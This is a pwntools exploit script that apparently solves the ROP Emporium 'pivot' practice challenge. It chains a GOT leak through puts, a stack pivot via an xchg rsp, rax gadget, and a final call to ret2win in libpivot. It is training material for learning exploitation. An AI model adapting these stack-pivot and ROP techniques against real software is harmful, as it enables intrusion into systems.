#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pivot'
elf = context.binary = ELF(exe, checksec=True)
libpivot = './libpivot.so'
libpivot = ELF(libpivot, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                     EXPLOITS (MANUAL)
# =========================================================
def manual():
    io = initialize()
    rop = ROP(exe)
    
    io.recvuntil(b'pivot: ')
    pivot_addr = int(io.recvline().strip(), 16)
    
    payload = flat([
        elf.plt['foothold_function'],
        rop.rdi.address,
        elf.got['foothold_function'],
        elf.plt['puts'],
        elf.sym['main']
    ])
    io.sendlineafter(b'>', payload)
    
    payload = flat({
        40: [
            rop.rax.address,
            pivot_addr,
            0x4009bd,        # xchg rsp, rax; ret;
            elf.sym['main']
            
        ]
    })
    io.sendlineafter(b'>', payload)
    
    io.recvlines(2)
    leak = unpack(io.recvline().strip().ljust(8, b'\x00'))
    libpivot.address = leak - libpivot.sym['foothold_function']

    payload = flat({
        40: [
            libpivot.sym['ret2win']
        ]
    })
    io.sendlineafter(b'>', payload)

    info('pivot address: %#x', pivot_addr)
    info('libpivot base address: %#x', libpivot.address)
    
    io.interactive()

# =========================================================
#                     EXPLOITS (AUTO)
# =========================================================
def auto():
    io = initialize()

    io.recvuntil(b'pivot: ')
    pivot_addr = int(io.recvline().strip(), 16)
    
    rop = ROP(exe)
    rop.call(elf.plt['foothold_function'])
    rop.call(elf.plt['puts'], [elf.got['foothold_function']])
    rop.call(elf.sym['main'])
    print(rop.dump())
    io.sendlineafter(b'>', rop.chain())
    
    rop = ROP(exe)
    rop.raw([rop.rax.address,
            pivot_addr,
            0x4009bd,        # xchg rsp, rax; ret;
            elf.sym['main']])
    print(rop.dump())
    io.sendlineafter(b'>', flat({40: rop.chain()}))
    
    io.recvlines(2)
    leak = unpack(io.recvline().strip().ljust(8, b'\x00'))
    libpivot.address = leak - libpivot.sym['foothold_function']
    
    rop = ROP(exe)
    rop.call(libpivot.sym['ret2win'])
    print(rop.dump())
    io.sendlineafter(b'>', flat({40: rop.chain()}))
    
    info('pivot address: %#x', pivot_addr)
    info('libpivot base address: %#x', libpivot.address)

    io.interactive()
    
if __name__ == '__main__':
    # manual()
    auto()